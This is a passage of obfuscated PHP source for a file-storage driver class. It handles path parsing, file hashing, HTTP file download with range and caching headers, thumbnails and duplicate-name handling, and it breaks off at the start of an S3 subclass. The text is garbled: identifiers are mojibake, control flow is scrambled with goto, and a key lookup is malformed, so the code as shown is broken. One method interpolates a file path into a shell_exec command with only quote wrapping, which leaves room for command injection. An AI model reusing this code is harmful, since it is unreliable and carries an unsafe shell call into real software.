$B·éáÉ‚›„[$E´ƒŸ„¿µø[99]] = $Cš‚ –ö¾î; $B·éáÉ‚›„[$E´ƒŸ„¿µø[100]] = $fœ”—Ê­Œ§; } return $B·éáÉ‚›„; goto C›²ÚÚ¯¢; C²âŠÜòÖ: $E´ƒŸ„¿µø =& $_SERVER[¨¤¼…´]; if ($this->isUploadServer()) { return; } $fœ”—Ê­Œ§ = $this->getType(); goto A›ƒÅ¡; A›ƒÅ¡: if (!in_array($fœ”—Ê­Œ§, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $a ×Î¨¨¢Ü = 1024 * 1024 * 10; goto F÷„‘Ş‚‰; F÷„‘Ş‚‰: $e¦àïïé¬Ø = $b‰Å¡Í‹øâ <= $a ×Î¨¨¢Ü ? $E´ƒŸ„¿µø[97] : $E´ƒŸ„¿µø[98]; $eã–à˜Öø = (!$b‰Å¡Í‹øâ ? 1 : ceil($b‰Å¡Í‹øâ / pow(1024, 3))) * 3600 * 4; $B·éáÉ‚›„ = $this->{$e¦àïïé¬Ø}($Cš‚ –ö¾î, $eã–à˜Öø); goto C‚Ú‚®Š‰; C›²ÚÚ¯¢: } public function uploadFormData($cÖÔÇ†Â¥¡, $FËİÉÅ´„ = 3600) { } public function multiUploadFormData($aŠ˜›ÓÉ¾¶, $bâ˜ƒÑ¯Š = 3600) { } public function download($Cª¶îªğÛÒ, $aÁù¦¾†¼ô) { } public function ext($A¿ĞÉÕù‰œ) { $B˜éòŒÁÉ¶ =& $_SERVER[¨¤¼…´]; if (strpos($A¿ĞÉÕù‰œ, $B˜éòŒÁÉ¶[8]) === -1) { $B—œ¥Èï² = $A¿ĞÉÕù‰œ; } else { $B—œ¥Èï² = $this->pathThis($A¿ĞÉÕù‰œ); } $eĞÓ„„ ßÕ = $B˜éòŒÁÉ¶[43]; if (strstr($B—œ¥Èï², $B˜éòŒÁÉ¶[101])) { $eĞÓ„„ ßÕ = substr($B—œ¥Èï², strrpos($B—œ¥Èï², $B˜éòŒÁÉ¶[101]) + 1); $eĞÓ„„ ßÕ = strtolower($eĞÓ„„ ßÕ); } if (strlen($eĞÓ„„ ßÕ) > 3 && preg_match($B˜éòŒÁÉ¶[102], $eĞÓ„„ ßÕ, $e“¹Æ‡‘¤ )) { $eĞÓ„„ ßÕ = $B˜éòŒÁÉ¶[43]; } return $eĞÓ„„ ßÕ; } public function pathThis($f³·êÍóµ) { $CÑ¾ìÉÜä¢ =& $_SERVER[¨¤¼…´]; $f³·êÍóµ = str_replace($CÑ¾ìÉÜä¢[103], $CÑ¾ìÉÜä¢[8], rtrim($f³·êÍóµ, $CÑ¾ìÉÜä¢[8])); $F”²¦Ì¬é½ = strrpos($f³·êÍóµ, $CÑ¾ìÉÜä¢[8]); if ($F”²¦Ì¬é½ === !1) { return $f³·êÍóµ; } return substr($f³·êÍóµ, $F”²¦Ì¬é½ + 1); } public function pathFather($e¶‰ëÕ˜ßª) { $cÇšâß…¸ˆ =& $_SERVER[¨¤¼…´]; $e¶‰ëÕ˜ßª = str_replace($cÇšâß…¸ˆ[103], $cÇšâß…¸ˆ[8], rtrim($e¶‰ëÕ˜ßª, $cÇšâß…¸ˆ[8])); $aŒ‹”ò»†Œ = strrpos($e¶‰ëÕ˜ßª, $cÇšâß…¸ˆ[8]); if ($aŒ‹”ò»†Œ === !1) { return $cÇšâß…¸ˆ[43]; } return substr($e¶‰ëÕ˜ßª, 0, $aŒ‹”ò»†Œ + 1); } public function hashSimple($BĞèÁéæµ©) { goto bÆ¾Ñæõ“; D³µ«¢¹Î: $fµèÂ—Æ…Ÿ = 200; $dñØÕºøİí = 50; if ($a“’ĞæÒ²• <= $fµèÂ—Æ…Ÿ * $dñØÕºøİí) { return $this->hashMd5($BĞèÁéæµ©) . $a“’ĞæÒ²•; } goto B˜­‰ŠÚ¹; CÔæÚø†: $B‚ÏÒ“®Ó  .= $this->fileSubstr($BĞèÁéæµ©, $a“’ĞæÒ²• - $fµèÂ—Æ…Ÿ, $fµèÂ—Æ…Ÿ); return md5($B‚ÏÒ“®Ó ) . $a“’ĞæÒ²•; goto Fò¥­ÒŸ¸”; B˜­‰ŠÚ¹: $A›ñõ³­´í = intval($a“’ĞæÒ²• / $dñØÕºøİí); $B‚ÏÒ“®Ó  = $eŞ×«Ç—è[43]; for ($F¸‚‰Çï©Ä = 0; $F¸‚‰Çï©Ä < $dñØÕºøİí; $F¸‚‰Çï©Ä++) { $B‚ÏÒ“®Ó  .= $this->fileSubstr($BĞèÁéæµ©, $A›ñõ³­´í * $F¸‚‰Çï©Ä, $fµèÂ—Æ…Ÿ); } goto CÔæÚø†; bÆ¾Ñæõ“: $eŞ×«Ç—è =& $_SERVER[¨¤¼…´]; if (!$BĞèÁéæµ©) { return md5($eŞ×«Ç—è[43]); } $a“’ĞæÒ²• = $this->size($BĞèÁéæµ©); goto D³µ«¢¹Î; Fò¥­ÒŸ¸”: } public static $md5Cache = array(); public function hashMd5($eª÷‹á‚®÷) { $eª÷‹á‚®÷ = $this->iconvSystem($eª÷‹á‚®÷); if (isset(self::$md5Cache[$eª÷‹á‚®÷])) { return self::$md5Cache[$eª÷‹á‚®÷]; } self::$md5Cache[$eª÷‹á‚®÷] = $this->hashMd5Shell($eª÷‹á‚®÷); if (!self::$md5Cache[$eª÷‹á‚®÷]) { self::$md5Cache[$eª÷‹á‚®÷] = @md5_file($eª÷‹á‚®÷); } return self::$md5Cache[$eª÷‹á‚®÷]; } private function hashMd5Shell($A¥é†õœ×) { goto EÏ‹®Çøéğ; EÏ’ÑÇ‡Ã§: $aÛĞùÚöô = shell_exec($Eã‡²™ò•ƒ . "\40\x22{$A¥é†õœ×}\42"); $aÛĞùÚöô = str_replace($d‡Ù³ÉùÉ[110], $d‡Ù³ÉùÉ[43], $aÛĞùÚöô); return substr($aÛĞùÚöô, 0, 32); goto Fï’…˜òÆµ; EÏ‹®Çøéğ: $d‡Ù³ÉùÉ =& $_SERVER[¨¤¼…´]; if (!function_exists($d‡Ù³ÉùÉ[104])) { return !1; } $c¸ù³ƒÚº = array($d‡Ù³ÉùÉ[105], $d‡Ù³ÉùÉ[106]); goto a…ùˆ„¨¦•; a…ùˆ„¨¦•: $Eã‡²™ò•ƒ = Cache::get($d‡Ù³ÉùÉ[107]); if (!$Eã‡²™ò•ƒ) { $F‰ÑïŞÎ°ë = BASIC_PATH . $d‡Ù³ÉùÉ[108]; $eß……¤ó÷Ê = md5_file($F‰ÑïŞÎ°ë); $Eã‡²™ò•ƒ = $d‡Ù³ÉùÉ[109]; foreach ($c¸ù³ƒÚº as $b‰ê„ÜšÚä) { $aÛĞùÚöô = shell_exec($b‰ê„ÜšÚä . "\x20\42{$F‰ÑïŞÎ°ë}\42"); if ($aÛĞùÚöô && substr(trim($aÛĞùÚöô), 0, 32) == $eß……¤ó÷Ê) { $Eã‡²™ò•ƒ = $b‰ê„ÜšÚä; break; } } Cache::set($d‡Ù³ÉùÉ[107], $Eã‡²™ò•ƒ, 3600); } if ($Eã‡²™ò•ƒ == $d‡Ù³ÉùÉ[109]) { return !1; } goto EÏ’ÑÇ‡Ã§; Fï’…˜òÆµ: } public function link($Fõ¸È÷ë…) { return $Fõ¸È÷ë…; } public function fileOut($a®À¢åáŠ¯, $AÊ™ŞîñÈ‡ = false, $cºÀÈÖÓ˜œ = false, $A¥É²É¸–£ = '') { goto CÊâò¨‚Æß; eªÂ·“ãÛ¥: $b×‹×’òà‘ = $this->getType() == $AÎõ†Ñ·Ñ¨[112]; $b²„®”Øˆö = $GLOBALS[$AÎõ†Ñ·Ñ¨[6]][$AÎõ†Ñ·Ñ¨[94]][$AÎõ†Ñ·Ñ¨[113]][$AÎõ†Ñ·Ñ¨[114]]; $BŠê•Ã•Êö = (double) $GLOBALS[$AÎõ†Ñ·Ñ¨[6]][$AÎõ†Ñ·Ñ¨[94]][$AÎõ†Ñ·Ñ¨[113]][$AÎõ†Ñ·Ñ¨[115]] * 1024 * 1024; goto Aå¸Ô¨ÀĞÇ; f†ğ†½”¬¹: header($AÎõ†Ñ·Ñ¨[135]); header($AÎõ†Ñ·Ñ¨[136]); header($AÎõ†Ñ·Ñ¨[137]); goto bÂŠ‚›Ôâ; bÂŠ‚›Ôâ: if (isset($_SERVER[$AÎõ†Ñ·Ñ¨[138]]) && strtotime($_SERVER[$AÎõ†Ñ·Ñ¨[138]]) == $C¥‘©ŠçèË[$AÎõ†Ñ·Ñ¨[117]]) { header($AÎõ†Ñ·Ñ¨[139], !0, 304); die; } if (isset($_SERVER[$AÎõ†Ñ·Ñ¨[140]]) && $_SERVER[$AÎõ†Ñ·Ñ¨[140]] == $A¥É²É¸–£) { header($AÎõ†Ñ·Ñ¨[141] . $A¥É²É¸–£, !0, 304); die; } header($AÎõ†Ñ·Ñ¨[141] . $A¥É²É¸–£); goto dË‰’›¼Ìƒ; aÚËÖ¤¶£: header($AÎõ†Ñ·Ñ¨[131]); header($AÎõ†Ñ·Ñ¨[132] . $eœ„ö‚Ø†Ø); header($AÎõ†Ñ·Ñ¨[133] . gmdate($AÎõ†Ñ·Ñ¨[116], time() + 3600 * 24 * 30) . $AÎõ†Ñ·Ñ¨[134]); goto f†ğ†½”¬¹; CÊâò¨‚Æß: $AÎõ†Ñ·Ñ¨ =& $_SERVER[¨¤¼…´]; $this->cacheMethod(null, null); if (!$a®À¢åáŠ¯ || !$this->exist($a®À¢åáŠ¯)) { show_json(LNG($AÎõ†Ñ·Ñ¨[111]), !1, $cºÀÈÖÓ˜œ); } goto eªÂ·“ãÛ¥; dÛ¼±Ô®¶: $AŒ»‰¾ˆ×½ = !0; if ($_SERVER[$AÎõ†Ñ·Ñ¨[161]] == $AÎõ†Ñ·Ñ¨[162] && $BÚ•èìˆ” > 1204 * 1024 * 1024 * 2) { $AŒ»‰¾ˆ×½ = !1; } if ($AŒ»‰¾ˆ×½) { header($AÎõ†Ñ·Ñ¨[163] . ($Bˆåˆ¼‚Õö - $föÕ‘åª• + 1)); } goto Aä¤ÛÅÂ; aãİ±ÁÛ™ù: $eœ„ö‚Ø†Ø = get_file_mime($FÙÍ‡±¿˜¡); if (strstr($eœ„ö‚Ø†Ø, $AÎõ†Ñ·Ñ¨[124])) { $eœ„ö‚Ø†Ø = $eœ„ö‚Ø†Ø . $AÎõ†Ñ·Ñ¨[125]; } if ($AÊ™ŞîñÈ‡ === !1 && !mime_support($eœ„ö‚Ø†Ø)) { $AÊ™ŞîñÈ‡ = !0; $eœ„ö‚Ø†Ø = $AÎõ†Ñ·Ñ¨[126]; } goto fí‹öÌ§¨„; d°òÌ·„ö¿: if (in_array($FÙÍ‡±¿˜¡, array($AÎõ†Ñ·Ñ¨[118], $AÎõ†Ñ·Ñ¨[119], $AÎõ†Ñ·Ñ¨[120], $AÎõ†Ñ·Ñ¨[121]))) { $FÙÍ‡±¿˜¡ = $AÎõ†Ñ·Ñ¨[122]; } if (!$A¥É²É¸–£) { $A¥É²É¸–£ = md5($EÏ”ë¸“Üà . $this->hashSimple($a®À¢åáŠ¯)); } $A¥É²É¸–£ = $AÎõ†Ñ·Ñ¨[123] . $A¥É²É¸–£ . $AÎõ†Ñ·Ñ¨[123]; goto aãİ±ÁÛ™ù; dË‰’›¼Ìƒ: header($AÎõ†Ñ·Ñ¨[142] . $EÏ”ë¸“Üà . $AÎõ†Ñ·Ñ¨[134]); header($AÎõ†Ñ·Ñ¨[143] . $EÊÆ©Ìî¤â); header($AÎõ†Ñ·Ñ¨[144]); goto AŒ˜ñ¼ŠÁ²; C…Ş®÷ª: $föÕ‘åª• = 0; $Bˆåˆ¼‚Õö = $BÚ•èìˆ” - 1; $FÙÍ‡±¿˜¡ = $this->ext($EÊÆ©Ìî¤â); goto d°òÌ·„ö¿; e‘è”‘Ñå: if ($BŠê•Ã•Êö) { $CíáÛÄã›Ö = intval(1000 * 1000 * ($eô·Ğ£â› / $BŠê•Ã•Êö)); } while ($föÕ‘åª• <= $Bˆåˆ¼‚Õö) { $bñ®¸¤™­ = timeFloat(); check_abort(); $a©ƒòÌ‡˜ = $Bˆåˆ¼‚Õö - $föÕ‘åª• + 1; if ($a©ƒòÌ‡˜ <= $eô·Ğ£â›) { $eô·Ğ£â› = $a©ƒòÌ‡˜; } echo $this->fileSubstr($a®À¢åáŠ¯, $föÕ‘åª•, $eô·Ğ£â›); $föÕ‘åª• += $eô·Ğ£â›; if ($eô·Ğ£â› == $a©ƒòÌ‡˜) { $föÕ‘åª• = $Bˆåˆ¼‚Õö + 1; } if ($CíáÛÄã›Ö) { $C¿ÂŠ÷…Ï = intval(1000 * 1000 * (timeFloat() - $bñ®¸¤™­)); $D³Š¤¤„°× = $CíáÛÄã›Ö - $C¿ÂŠ÷…Ï; if ($D³Š¤¤„°× > 5) { usleep($D³Š¤¤„°×); } } } goto aÌÉ±´Üø; Aä¤ÛÅÂ: if ($_SERVER[$AÎõ†Ñ·Ñ¨[164]] == $AÎõ†Ñ·Ñ¨[165]) { return; } $eô·Ğ£â› = 1024 * 100; $CíáÛÄã›Ö = 0; goto e‘è”‘Ñå; c¦„Ù•†’: $BÊ»ÌÀÖï× = strtolower($_SERVER[$AÎõ†Ñ·Ñ¨[149]]); if ($b×‹×’òà‘ && $BÊ»ÌÀÖï× && $b²„®”Øˆö) { if (strstr($BÊ»ÌÀÖï×, $AÎõ†Ñ·Ñ¨[150])) { header($AÎõ†Ñ·Ñ¨[151] . $a®À¢åáŠ¯); } else { if (strstr($BÊ»ÌÀÖï×, $AÎõ†Ñ·Ñ¨[152])) { header($AÎõ†Ñ·Ñ¨[153] . $a®À¢åáŠ¯); } else { if (strstr($BÊ»ÌÀÖï×, $AÎõ†Ñ·Ñ¨[154])) { header($AÎõ†Ñ·Ñ¨[155] . $a®À¢åáŠ¯); } } } if ($BŠê•Ã•Êö) { header($AÎõ†Ñ·Ñ¨[156] . $BŠê•Ã•Êö); } return; } if (isset($_SERVER[$AÎõ†Ñ·Ñ¨[157]])) { if (preg_match($AÎõ†Ñ·Ñ¨[158], $_SERVER[$AÎõ†Ñ·Ñ¨[157]], $EÉ“ø‚ñ¥)) { $föÕ‘åª• = intval($EÉ“ø‚ñ¥[1]); if (!empty($EÉ“ø‚ñ¥[2])) { $Bˆåˆ¼‚Õö = intval($EÉ“ø‚ñ¥[2]); } } header($AÎõ†Ñ·Ñ¨[159]); header("\103\157\x6e\164\x65\x6e\164\55\x52\141\156\147\145\72\40\x62\x79\x74\145\163\40{$föÕ‘åª•}\x2d{$Bˆåˆ¼‚Õö}\57" . $BÚ•èìˆ”); } else { header($AÎõ†Ñ·Ñ¨[160]); } goto dÛ¼±Ô®¶; FÖóİß—Ÿ: $BÚ•èìˆ” = $C¥‘©ŠçèË[$AÎõ†Ñ·Ñ¨[87]]; $EÏ”ë¸“Üà = gmdate($AÎõ†Ñ·Ñ¨[116], $C¥‘©ŠçèË[$AÎõ†Ñ·Ñ¨[117]]); $EÊÆ©Ìî¤â = $cºÀÈÖÓ˜œ ? $cºÀÈÖÓ˜œ : $this->iconvApp($C¥‘©ŠçèË[$AÎõ†Ñ·Ñ¨[38]]); goto C…Ş®÷ª; fí‹öÌ§¨„: $aÄÆÃ†¬ = rawurlencode($EÊÆ©Ìî¤â); $aÄÆÃ†¬ = $AÎõ†Ñ·Ñ¨[123] . $aÄÆÃ†¬ . $AÎõ†Ñ·Ñ¨[127] . $aÄÆÃ†¬; if ($AÊ™ŞîñÈ‡) { header($AÎõ†Ñ·Ñ¨[128]); header($AÎõ†Ñ·Ñ¨[129] . $aÄÆÃ†¬); } else { header($AÎõ†Ñ·Ñ¨[130] . $aÄÆÃ†¬); } goto aÚËÖ¤¶£; Aå¸Ô¨ÀĞÇ: @ob_end_clean(); set_timeout(); $C¥‘©ŠçèË = $this->infoFull($a®À¢åáŠ¯); goto FÖóİß—Ÿ; AŒ˜ñ¼ŠÁ²: header($AÎõ†Ñ·Ñ¨[145] . $BÚ•èìˆ”); header($AÎõ†Ñ·Ñ¨[146]); if (!$AÊ™ŞîñÈ‡ && $FÙÍ‡±¿˜¡ == $AÎõ†Ñ·Ñ¨[147]) { if ($BÚ•èìˆ” > 1024 * 1024 * 5) { die; } $dŠ±Æø­´à = $this->getContent($a®À¢åáŠ¯); $dŠ±Æø­´à = Html::clearSVG($dŠ±Æø­´à); header($AÎõ†Ñ·Ñ¨[148] . $BÚ•èìˆ”); echo $dŠ±Æø­´à; die; } goto c¦„Ù•†’; aÌÉ±´Üø: } public function fileOutServer($d­ª¤‡©†, $AùÁÓ±‰êæ = false, $DÚÃ®÷±Á = false, $cöŠÆ¶§ëŞ = '') { $this->fileOut($d­ª¤‡©†, $AùÁÓ±‰êæ, $DÚÃ®÷±Á, $cöŠÆ¶§ëŞ); } public function fileOutLink($aÕ’œğÅÂŒ) { header($_SERVER[¨¤¼…´][166] . $aÕ’œğÅÂŒ); die; } public function cacheMethod($cƒÒÎ•¾š¶, $e¤Ìá°ä£ö) { goto B……¡×ÄÔÙ; D²‘¬Èİ›â: $C“Î°ÜÛÚ— = $D±Šó„Å±î[167] . $cƒÒÎ•¾š¶ . $D±Šó„Å±î[168] . rtrim($c›…”“¸Œ¿, $D±Šó„Å±î[8]); if (is_null($cƒÒÎ•¾š¶)) { $F§çïå˜Ø¯ = array(); return; } if (is_null($e¤Ìá°ä£ö)) { unset($F§çïå˜Ø¯[$C“Î°ÜÛÚ—]); return; } goto E§ß¥Ğ›æÌ; E§ß¥Ğ›æÌ: $D¿†—ÔÁ = isset($F§çïå˜Ø¯[$C“Î°ÜÛÚ—]) ? $F§çïå˜Ø¯[$C“Î°ÜÛÚ—] : null; if (!is_null($D¿†—ÔÁ)) { return $D¿†—ÔÁ; } $D¿†—ÔÁ = $this->{$cƒÒÎ•¾š¶}($e¤Ìá°ä£ö); goto A¦–ÉºğÎ®; A¦–ÉºğÎ®: $F§çïå˜Ø¯[$C“Î°ÜÛÚ—] = $D¿†—ÔÁ; return $D¿†—ÔÁ; goto eÃæÙÆÄŸï; B……¡×ÄÔÙ: $D±Šó„Å±î =& $_SERVER[¨¤¼…´]; static $F§çïå˜Ø¯ = array(); $c›…”“¸Œ¿ = $e¤Ìá°ä£ö ? ltrim($this->getPathOuter($e¤Ìá°ä£ö), $D±Šó„Å±î[8]) : $e¤Ìá°ä£ö; goto D²‘¬Èİ›â; eÃæÙÆÄŸï: } public function fileOutImage($D‰ù£¦¡Ç‡, $e‡‚è³–§ = 250) { goto bºÌ¥³«Ä; DÒ²İØÍîæ: IO::fileOut($fÖ‘šÓØ¼ä); goto e™è¬”¯¥õ; fá¦ğùÎ„Í: if (!file_exists($dÆ±ö ¡Â›) || filesize($dÆ±ö ¡Â›) < 100) { return @file_exists($AÃÆ½šÕÒ) ? IO::fileOut($AÃÆ½šÕÒ) : $this->fileOut($D‰ù£¦¡Ç‡); } if (!($fÖ‘šÓØ¼ä = IO::move($dÆ±ö ¡Â›, $bÛ…æöÈ))) { return IO::fileOut($dÆ±ö ¡Â›); } del_file($dÆ±ö ¡Â›); goto DÒ²İØÍîæ; b«†òĞÕÏ: if ($FÔùµÑç‹[$F‚ğÑõã…Ø[87]] <= 1024 * 50 || $B¡õÙ£âº² || !function_exists($F‚ğÑõã…Ø[174]) || $FÔùµÑç‹[$F‚ğÑõã…Ø[175]] == $F‚ğÑõã…Ø[176]) { return $this->fileOut($D‰ù£¦¡Ç‡, !1, $D÷˜ŞÂšó); } if (isset($FÔùµÑç‹[$F‚ğÑõã…Ø[171]][$F‚ğÑõã…Ø[177]])) { $EÈÄšŸµñ¼ = $FÔùµÑç‹[$F‚ğÑõã…Ø[171]][$F‚ğÑõã…Ø[177]]; } else { if (isset($FÔùµÑç‹[$F‚ğÑõã…Ø[171]][$F‚ğÑõã…Ø[178]])) { $EÈÄšŸµñ¼ = $FÔùµÑç‹[$F‚ğÑõã…Ø[171]][$F‚ğÑõã…Ø[178]]; } else { $EÈÄšŸµñ¼ = md5("{$FÔùµÑç‹[$F‚ğÑõã…Ø[38]]}\137{$FÔùµÑç‹[$F‚ğÑõã…Ø[85]]}\x5f{$FÔùµÑç‹[$F‚ğÑõã…Ø[87]]}"); } } $EÙøœ‡–äæ = "{$EÈÄšŸµñ¼}\137{$e‡‚è³–§}\x2e\160\x6e\x67"; goto a‡ÇíëÓÊá; bºÌ¥³«Ä: $F‚ğÑõã…Ø =& $_SERVER[¨¤¼…´]; if (substr($D‰ù£¦¡Ç‡, 0, 4) == $F‚ğÑõã…Ø[154]) { $this->fileOutLink($D‰ù£¦¡Ç‡); } $FÔùµÑç‹ = $this->info($D‰ù£¦¡Ç‡); goto F¦÷Ú­èˆ‹; a‡ÇíëÓÊá: if (!($b„ÕèÃÎ¥÷ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $F‚ğÑõã…Ø[179]))) { $bÛ…æöÈ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $F‚ğÑõã…Ø[180]); } else { $bÛ…æöÈ = KodIO::make($b„ÕèÃÎ¥÷); } if ($b„ÕèÃÎ¥÷ = IO::fileNameExist($bÛ…æöÈ, $EÙøœ‡–äæ)) { $dÆ±ö ¡Â› = KodIO::make($b„ÕèÃÎ¥÷); return IO::fileOut($dÆ±ö ¡Â›, !1, $D÷˜ŞÂšó); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto Aã£–ã¹´ù; Aã£–ã¹´ù: $dÆ±ö ¡Â› = DATA_THUMB . $EÙøœ‡–äæ; del_file($dÆ±ö ¡Â›); if (!@file_exists($dÆ±ö ¡Â›)) { $cÕèÀ•Ù¬¤ = TEMP_FILES; if (!is_dir($cÕèÀ•Ù¬¤)) { mk_dir($cÕèÀ•Ù¬¤); } $AÃÆ½šÕÒ = $cÕèÀ•Ù¬¤ . $EÈÄšŸµñ¼ . $F‚ğÑõã…Ø[101] . $FÔùµÑç‹[$F‚ğÑõã…Ø[175]]; if (!@file_exists($AÃÆ½šÕÒ)) { $AÃÆ½šÕÒ = $this->download($D‰ù£¦¡Ç‡, $AÃÆ½šÕÒ); } $Eí»¢ÇÚ = new ImageThumb($AÃÆ½šÕÒ, $F‚ğÑõã…Ø[181]); $Eí»¢ÇÚ->prorate($dÆ±ö ¡Â›, $e‡‚è³–§, $e‡‚è³–§ * 10); } goto fá¦ğùÎ„Í; F¦÷Ú­èˆ‹: $D÷˜ŞÂšó = $FÔùµÑç‹[$F‚ğÑõã…Ø[38]]; $B¡õÙ£âº² = !1; if (isset($GLOBALS[$F‚ğÑõã…Ø[169]]) && $GLOBALS[$F‚ğÑõã…Ø[169]][$F‚ğÑõã…Ø[85]] == $FÔùµÑç‹[$F‚ğÑõã…Ø[85]]) { $CÔ¨®‹’’œ = $GLOBALS[$F‚ğÑõã…Ø[169]][$F‚ğÑõã…Ø[170]]; if (!$FÔùµÑç‹[$F‚ğÑõã…Ø[171]]) { $FÔùµÑç‹[$F‚ğÑõã…Ø[171]] = $GLOBALS[$F‚ğÑõã…Ø[169]]; } if (isset($CÔ¨®‹’’œ[$F‚ğÑõã…Ø[172]])) { if ($CÔ¨®‹’’œ[$F‚ğÑõã…Ø[172]] <= $e‡‚è³–§ && $CÔ¨®‹’’œ[$F‚ğÑõã…Ø[173]] <= $e‡‚è³–§) { $B¡õÙ£âº² = !0; } } $D÷˜ŞÂšó = $FÔùµÑç‹[$F‚ğÑõã…Ø[171]][$F‚ğÑõã…Ø[38]]; } goto b«†òĞÕÏ; e™è¬”¯¥õ: } public function fileOutImageServer($cÅçœÛóˆ”, $DÈ—¯†Ó = 250) { $this->fileOutImage($cÅçœÛóˆ”, $DÈ—¯†Ó); } public function fileNameAuto($C¨œ“Òª”ñ, $EØëÊö‰…æ, $b¬Æ•¡ßù¤ = REPEAT_RENAME, $e İ×‘Öçª = false) { goto CÖ´™™£Ù¯; CÖ´™™£Ù¯: $a§§Ğì Ï¯ =& $_SERVER[¨¤¼…´]; $F¢¦…õÖœå = $C¨œ“Òª”ñ === $a§§Ğì Ï¯[43] ? $EØëÊö‰…æ : rtrim($C¨œ“Òª”ñ, $a§§Ğì Ï¯[8]) . $a§§Ğì Ï¯[8] . $EØëÊö‰…æ; if ($b¬Æ•¡ßù¤ == REPEAT_REPLACE || !$this->exist($F¢¦…õÖœå) || $e İ×‘Öçª && $b¬Æ•¡ßù¤ != REPEAT_RENAME_FOLDER) { return $EØëÊö‰…æ; } goto F´Ò£³ó˜; c†çíó“Ÿß: $cÂŒÖƒÙÇÜ = 1; $bëœ˜‡ÕÁÀ = substr($EØëÊö‰…æ, 0, strlen($EØëÊö‰…æ) - strlen($B’ø¯‘åöï)); $Cá¡êßÁ×ğ = $bëœ˜‡ÕÁÀ . "\x28{$cÂŒÖƒÙÇÜ}\51{$B’ø¯‘åöï}"; goto D´š¼ÏŠŒ¢; D´š¼ÏŠŒ¢: while ($this->exist(rtrim($C¨œ“Òª”ñ, $a§§Ğì Ï¯[8]) . $a§§Ğì Ï¯[8] . $Cá¡êßÁ×ğ)) { $Cá¡êßÁ×ğ = $bëœ˜‡ÕÁÀ . "\x28{$cÂŒÖƒÙÇÜ}\x29{$B’ø¯‘åöï}"; $cÂŒÖƒÙÇÜ++; } return $Cá¡êßÁ×ğ; goto e¡ŒæÒ÷¤; F´Ò£³ó˜: if ($b¬Æ•¡ßù¤ == REPEAT_SKIP) { return !1; } $B’ø¯‘åöï = $a§§Ğì Ï¯[101] . get_path_ext($EØëÊö‰…æ); $B’ø¯‘åöï = $B’ø¯‘åöï == $a§§Ğì Ï¯[101] || $e İ×‘Öçª ? $a§§Ğì Ï¯[43] : $B’ø¯‘åöï; goto c†çíó“Ÿß; e¡ŒæÒ÷¤: } public function listAllFiles($E½…ŸïÌ¾, $FÑ£ÓËÇˆî, $a°Ë¤õ = array()) { goto b˜êõöÓŒº; b˜êõöÓŒº: $B¿Ñå‰¹æ– =& $_SERVER[¨¤¼…´]; if (empty($FÑ£ÓËÇˆî)) { return array(); } $aÚØªÑ­Î = array(); goto eÖç«¨Ÿ„; EæÕÌÔØêÊ: foreach (array_unique($aÚØªÑ­Î) as $b”ºİæ¹›„) { $bÅã¦ïŸÉ¥ = array($B¿Ñå‰¹æ–[85] => $this->getPathOuter($B¿Ñå‰¹æ–[8] . $E½…ŸïÌ¾ . $B¿Ñå‰¹æ–[8] . $b”ºİæ¹›„), $B¿Ñå‰¹æ–[86] => 1, $B¿Ñå‰¹æ–[87] => 0); if (substr($b”ºİæ¹›„, -1) != $B¿Ñå‰¹æ–[8]) { $bÅã¦ïŸÉ¥[$B¿Ñå‰¹æ–[86]] = 0; $D¤ß±°‰©¹ = $this->getPath($E½…ŸïÌ¾ . $B¿Ñå‰¹æ–[8] . $b”ºİæ¹›„); $bÅã¦ïŸÉ¥[$B¿Ñå‰¹æ–[87]] = isset($a°Ë¤õ[$D¤ß±°‰©¹]) ? $a°Ë¤õ[$D¤ß±°‰©¹] : $this->size($D¤ß±°‰©¹); } $E³­‘²Çº[] = $bÅã¦ïŸÉ¥; } return $E³­‘²Çº; goto EÀà ‘ŠĞ; eÖç«¨Ÿ„: $E½…ŸïÌ¾ = trim($E½…ŸïÌ¾, $B¿Ñå‰¹æ–[8]); foreach ($FÑ£ÓËÇˆî as $b”ºİæ¹›„) { $f ÀìÕ¦œ = ltrim(substr($b”ºİæ¹›„, strlen($E½…ŸïÌ¾)), $B¿Ñå‰¹æ–[8]); $aÚØªÑ­Î = array_merge($aÚØªÑ­Î, $this->slicePath($f ÀìÕ¦œ)); } $E³­‘²Çº = array(); goto EæÕÌÔØêÊ; EÀà ‘ŠĞ: } public function slicePath($FïÎğ¹«Çù) { $bÈ÷Ï‘‘¤ =& $_SERVER[¨¤¼…´]; $dî†ï¦ÂÁœ = explode($bÈ÷Ï‘‘¤[8], trim($FïÎğ¹«Çù, $bÈ÷Ï‘‘¤[8])); $D„çš·Õ° = 0; do { ++$D„çš·Õ°; $Fª„ªõ–®¸[] = implode($bÈ÷Ï‘‘¤[8], array_slice($dî†ï¦ÂÁœ, 0, $D„çš·Õ°)) . $bÈ÷Ï‘‘¤[8]; } while ($D„çš·Õ° < count($dî†ï¦ÂÁœ)); $Fª„ªõ–®¸[count($dî†ï¦ÂÁœ) - 1] = $FïÎğ¹«Çù; return $Fª„ªõ–®¸; } public function getHost() { $E­ãİ¢‚Û» =& $_SERVER[¨¤¼…´]; $aÏòäÂ´½‚ = parse_url(trim($this->domain, $E­ãİ¢‚Û»[8])); $E‚°êØã˜¾ = isset($aÏòäÂ´½‚[$E­ãİ¢‚Û»[182]]) ? $aÏòäÂ´½‚[$E­ãİ¢‚Û»[182]] : http_type(); $f÷Ä¨›Ñá« = isset($aÏòäÂ´½‚[$E­ãİ¢‚Û»[183]]) ? $aÏòäÂ´½‚[$E­ãİ¢‚Û»[183]] : $aÏòäÂ´½‚[$E­ãİ¢‚Û»[85]]; if (isset($aÏòäÂ´½‚[$E­ãİ¢‚Û»[184]])) { $f÷Ä¨›Ñá« .= $E­ãİ¢‚Û»[4] . $aÏòäÂ´½‚[$E­ãİ¢‚Û»[184]]; } return $E‚°êØã˜¾ . $E­ãİ¢‚Û»[185] . $f÷Ä¨›Ñá«; } public function pathEncode($Có•Úó°¶) { $F¼×Ì—›„ =& $_SERVER[¨¤¼…´]; return str_replace($F¼×Ì—›„[186], $F¼×Ì—›„[8], rawurlencode($Có•Úó°¶)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($Eæ³ã£Š´Š) { set_timeout(); require_once 